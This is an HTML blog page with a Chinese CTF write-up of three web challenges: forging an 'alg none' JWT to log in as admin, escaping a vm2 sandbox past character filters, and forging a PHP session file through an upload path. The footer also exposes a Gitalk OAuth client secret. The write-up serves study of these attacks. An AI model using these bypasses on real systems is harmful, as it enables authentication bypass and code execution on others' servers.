@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>虎符CTF Web WP |  </title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="虎符CTF Web WP |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="虎符CTF Web WP"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/Bw0qUYeRI/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content=" "/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+        </span>
+            <h1>虎符CTF Web WP</h1>
+            <span class="meta">
+            	Posted on
+              2020-04-19，5 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <h1 id="web1">Web1</h1>
+<p>是个js。登陆界面。。还有注册。<br>
+尝试了下unicode。登陆后发现要admin才能cat flag<br>
+对JS不熟悉。。有些源码也不知道</p>
+<pre><code>/app.js
+/controllers/api.js
+</code></pre>
+<p>得到源码<br>
+分析下</p>
+<pre><code>注册的用户名不能是admin和空。
+然后secret是18位随机的16进制
+secretid是secrets的长度
+讲secret加入secret
+然后根据secretid，username，password，secret用HS256生成签名
+</code></pre>
+<pre><code>登陆的签名从header。或body。或query中取
+token=签名
+用json解析token。取第2段数据。base64解密。取其中的secretid字段赋值给sid
+sid不能==undefined。不能===null。长度不能&gt;secrets并且&lt;=0
+</code></pre>
+<p>乍一看没什么特别的点。<br>
+但是当初看过一题。修改JWT头。算法改为None。签名置空。绕过登陆<br>
+先抓个包看看jwt<br>
+<img src="https://guokeya.github.io/post-images/1587297173537.png" alt="" loading="lazy"><br>
+那么我们要将secret置为空。然后sid又要过下面的判断<br>
+这里<code>[]</code>可以过所有判断<br>
+那么现在就可以构造</p>
+<pre><code>const token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'});
+const token = jwt.sign({[],admin,123},null,{algorithm:none})
+</code></pre>
+<pre><code>const jwt=require('jsonwebtoken');
+const secretid=[];
+const username='admin';
+const password='123456';
+console.log(jwt.sign({secretid,username,password}, null, {algorithm: 'none'});
+</code></pre>
+<p>nodejs执行下得到jwt<br>
+登陆时替换。然后就得到了Flag</p>
+<h1 id="web2">Web2</h1>
+<p>通过run.php的报错和index.php的代码。。eval(code)没<code>$</code>。<br>
+大致可以判断是个nodejs。<br>
+后台大致是<code>eval(code)</code><br>
+用</p>
+<pre><code>var err = new Error();err.stack;
+打印出当前栈中的错误。可以看到vm2
+</code></pre>
+<p>过滤了部分字符。用数组就可以绕过<br>
+<code>https://github.com/patriksimek/vm2/issues/225</code><br>
+一把梭<br>
+<img src="https://guokeya.github.io/post-images/1587299335240.png" alt="" loading="lazy"><br>
+数组可以绕过过滤。也可以通过\x的方式来绕过</p>
+<pre><code>js中。可以用[]代替.
+TypeError.prototype==TypeError[`\xxx\xxx\xxx\xxx`]
+``反引号代替双引号
+</code></pre>
+<p><img src="https://guokeya.github.io/post-images/1587368301725.png" alt="" loading="lazy"><br>
+赵总的payload。是用占位符来拼接字符串</p>
+<pre><code>`${`${`prototyp`}e`}`
+`${&quot;prototype&quot;}`
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://guokeya.github.io/post-images/1587368642388.png" alt="" loading="lazy"></figure>
+<h1 id="web3">Web3</h1>
+<p>给出了源码</p>
+<pre><code>&lt;?php
+error_reporting(0);
+session_save_path(&quot;/var/babyctf/&quot;);
+session_start();
+require_once &quot;/flag&quot;;
+highlight_file(__FILE__);
+if($_SESSION['username'] ==='admin')
+{
+    $filename='/var/babyctf/success.txt';
+    if(file_exists($filename)){
+            safe_delete($filename);
+            die($flag);
+    }
+}
+else{
+    $_SESSION['username'] ='guest';
+}
+$direction = filter_input(INPUT_POST, 'direction');
+$attr = filter_input(INPUT_POST, 'attr');
+$dir_path = &quot;/var/babyctf/&quot;.$attr;
+if($attr===&quot;private&quot;){
+    $dir_path .= &quot;/&quot;.$_SESSION['username'];
+}
+if($direction === &quot;upload&quot;){
+    try{
+        if(!is_uploaded_file($_FILES['up_file']['tmp_name'])){
+            throw new RuntimeException('invalid upload');
+        }
+        $file_path = $dir_path.&quot;/&quot;.$_FILES['up_file']['name'];
+        $file_path .= &quot;_&quot;.hash_file(&quot;sha256&quot;,$_FILES['up_file']['tmp_name']);
+        if(preg_match('/(\.\.\/|\.\.\\\\)/', $file_path)){
+            throw new RuntimeException('invalid file path');
+        }
+        @mkdir($dir_path, 0700, TRUE);
+        if(move_uploaded_file($_FILES['up_file']['tmp_name'],$file_path)){
+            $upload_result = &quot;uploaded&quot;;
+        }else{
+            throw new RuntimeException('error while saving');
+        }
+    } catch (RuntimeException $e) {
+        $upload_result = $e-&gt;getMessage();
+    }
+} elseif ($direction === &quot;download&quot;) {
+    try{
+        $filename = basename(filter_input(INPUT_POST, 'filename'));
+        $file_path = $dir_path.&quot;/&quot;.$filename;
+        if(preg_match('/(\.\.\/|\.\.\\\\)/', $file_path)){
+            throw new RuntimeException('invalid file path');
+        }
+        if(!file_exists($file_path)) {
+            throw new RuntimeException('file not exist');
+        }
+        header('Content-Type: application/force-download');
+        header('Content-Length: '.filesize($file_path));
+        header('Content-Disposition: attachment; filename=&quot;'.substr($filename, 0, -65).'&quot;');
+        if(readfile($file_path)){
+            $download_result = &quot;downloaded&quot;;
+        }else{
+            throw new RuntimeException('error while saving');
+        }
+    } catch (RuntimeException $e) {
+        $download_result = $e-&gt;getMessage();
+    }
+    exit;
+}
+?&gt;
+</code></pre>
+<p>这里就重点讲一下关键代码<br>
+首先。拿到Flag。得存在success.txt。并且<code>session['username']=='admin'</code><br>
+我们看看。怎么成为admin。<br>
+session实质上是根据session文件来判断的。session会将一些信息。序列化成字符串。然后放入session文件。只要我们写一个session文件。内容是xxxxx:admin。就行了<br>
+先看看怎么写文件</p>
+<pre><code>session_save_path(&quot;/var/babyctf/&quot;);
+$dir_path = &quot;/var/babyctf/&quot;.filter_input(INPUT_POST, 'attr');
+$file_path = $dir_path.&quot;/&quot;.$_FILES['up_file']['name'].&quot;_&quot;.hash_file(&quot;sha256&quot;,$_FILES['up_file']['tmp_name']);
+</code></pre>
+<p>这里可以写文件。POST传参direction。拼接到/var/babyctf/。然后继续拼接文件名<code>_文件hash</code></p>
+<pre><code>/var/babyctf/$_POST['attr']/文件名_hash
+而我们要构造的是
+/var/babyctf/sess_xxxxx
+是不是很简单。。
+attr置为控。上传的文件名为sess。算出文件hash。
+就可以写一个sess_xxxx了
+</code></pre>
+<p>接下来去看文件内容。<br>
+这里还有个download。读取的功能</p>
+<pre><code>$attr = filter_input(INPUT_POST, 'attr');
+$filename = basename(filter_input(INPUT_POST, 'filename'));
+$dir_path = &quot;/var/babyctf/&quot;.$attr;
+$file_path = $dir_path.&quot;/&quot;.$filename;
+readfile($file_path)
+
+拼接如下
+/var/babyctf/$_POST['attr']/$_POST['filename']
+已知session存放在/var/babyctf/sess_sessionID
+那么attr置空。filename为session就行了
+</code></pre>
+<p><img src="https://guokeya.github.io/post-images/1587293541850.png" alt="" loading="lazy"><br>
+复制session内容(有个不可见的字符。。也要复制上去)到文件。函数算一下hash值<br>
+第一关。这就过去了。还要搞个success.txt<br>
+<code>file_exists</code>这个函数。用来匹配文件或文件夹是否存在。那么我们可以创建一个file_exists文件夹</p>
+<pre><code>根据之前的上传
+/var/babyctf/$_POST['attr']/文件名_hash
+
+我们可以控制attr。将其变成success.txt。其他随意
+</code></pre>
+<p>这个题。会自动删除文件。我真是。。。。。。mmp<br>
+开BURP一直跑<br>
+<img src="https://guokeya.github.io/post-images/1587293888927.png" alt="" loading="lazy"></p>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/w03k5QaVH/">
+              <span class="post-title">
+                 Chive CTF WP&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+            <li class="list-inline-item">
+              <a href="http://github.com/guokeya" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br ><!--test--></a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
